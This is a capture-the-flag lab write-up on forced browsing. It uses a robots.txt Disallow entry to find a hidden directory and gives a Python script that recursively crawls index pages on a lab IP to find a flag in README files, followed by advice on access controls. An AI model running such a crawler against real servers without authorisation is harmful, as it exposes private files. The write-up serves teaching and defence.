# Forced browsing attack

### Introduction
Forced browsing refers to the process of attempting to access and view files stored within directories on a web server.

### Procedure
After reviewing the `robots.txt` file, it is apparent that it includes `Disallow: /.hidden`, indicating that crawlers should refrain from accessing this directory. However, this directive does not explicitly prevent scraping content from this directory. Consequently, we plan to create a Python script to display the contents of each file within that folder.

### Program
To begin, we'll initiate by crafting a function that retrieves the content of a file stored on the server.
``` python
def try_robots(path: str = ""):
	url = f'http://192.168.56.101/.hidden{path}'

	response = requests.get(url)

	return response.text
```

Next, we'll use the previously created function to extract the content from each index page. This will provide us with information about the directories and files within the checked directory. Subsequently, we'll parse the index content to generate separate lists for directories and files.
``` python
def filter_index(path: str = "/"):
	text = try_robots(path)

	lines = text.split('\n')

	links = [x for x in lines if x.startswith('<a href=')]
	links.reverse()

	for link in links:
		if type(link) == str:
			start_index = link.find('"') + 1
			end_index = link.find('"', start_index + 1)
			if start_index != -1 and end_index != -1:
				file = link[start_index:end_index]
				new_path = path + file
				if file != "README":
					filter_index(new_path)
				else:
					text = try_robots(new_path)
					print(f"[{new_path}]: ", text)
					if len(text) > 40:
						exit()
```

If a value within that list is identified as `README`, we'll proceed to retrieve its content using the `try_robots()` function created earlier. Subsequently, if the content contains more than 40 characters, we can infer that it potentially includes the flag we're seeking.

### How to fix
To address this issue thoroughly, it is advisable to restrict access to this directory rather than solely disabling it within the `robots.txt` file. This involves configuring server-level permissions or utilizing access controls such as authentication mechanisms or web server configurations to prevent unauthorized access to the directory. Simply relying on the `robots.txt` file may not provide adequate protection against accessing sensitive content within the directory.

### Sources
[Forced browsing](https://owasp.org/www-community/attacks/Forced_browsing)